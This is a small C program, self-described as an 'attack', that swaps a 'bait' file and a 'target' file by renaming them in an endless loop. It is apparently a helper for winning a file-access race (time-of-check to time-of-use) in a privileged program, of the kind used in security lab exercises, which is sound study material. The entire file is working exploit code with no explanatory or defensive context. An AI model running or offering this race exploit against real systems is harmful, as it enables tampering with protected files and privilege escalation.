#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>


int rename(const char *oldpath, const char *newpath);
int swapFiles(const char *a, const char *b, char *argv[]);


int swapFiles(const char *a, const char *b, char *argv[]){
	
	const char *tempfile = "tempfile";
	if(rename(argv[1], tempfile) != 0){
		fprintf(stderr, "Error on first rename %s\nErrno code => %d\n", strerror(errno), errno);
		return -1;
	}

	if(rename(argv[2], argv[1]) != 0){
		fprintf(stderr, "Error on second rename %s\nErrno code => %d\n", strerror(errno), errno);
		return -1;
	}
	if(rename(tempfile, argv[2]) != 0){
		fprintf(stderr, "Error on third rename %s\nErrno code => %d\n", strerror(errno), errno);
		return -1;
	}

	return 0;
}

int main(int argc, char *argv[]){

	if(argc != 3){
		fprintf(stderr, "Please enter 2 args as file_1 and file_2\nUsage: ./attack file_1 file_2\n");
		return -1;
	}

	// Try to rename the target file argv[2] with the same name as bait file argv[1]
	while(1){
		swapFiles(argv[1], argv[2], argv);
	}
	return 0;
}

